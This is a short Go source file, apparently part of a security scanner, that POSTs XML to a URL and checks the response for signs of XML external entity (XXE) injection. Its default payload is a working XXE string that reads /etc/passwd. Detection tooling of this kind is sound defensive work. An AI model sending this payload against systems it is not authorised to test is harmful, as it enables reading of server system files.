package xxe

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

// ScanURLAndCheck sends a malicious XML payload to the given URL and checks for the given content.
func ScanURLAndCheck(url string, xmlPayload []byte, check string) (bool, error) {
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(xmlPayload))
	if err != nil {
		return false, fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/xml")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return false, fmt.Errorf("failed to send request: %w", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, fmt.Errorf("failed to read response body: %w", err)
	}

	if strings.Contains(string(body), check) {
		return true, nil
	}

	return false, nil
}

// ScanURLWithPayload sends a malicious XML payload to the given URL and checks for XXE.
func ScanURLWithPayload(url string, xmlPayload []byte) (bool, error) {
	return ScanURLAndCheck(url, xmlPayload, "root:x:0:0:")
}

// ScanURL sends a default malicious XML payload to the given URL and checks for XXE.
func ScanURL(url string) (bool, error) {
	// A simple XXE payload that attempts to read /etc/passwd
	xmlPayload := []byte(`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`)
	return ScanURLWithPayload(url, xmlPayload)
}
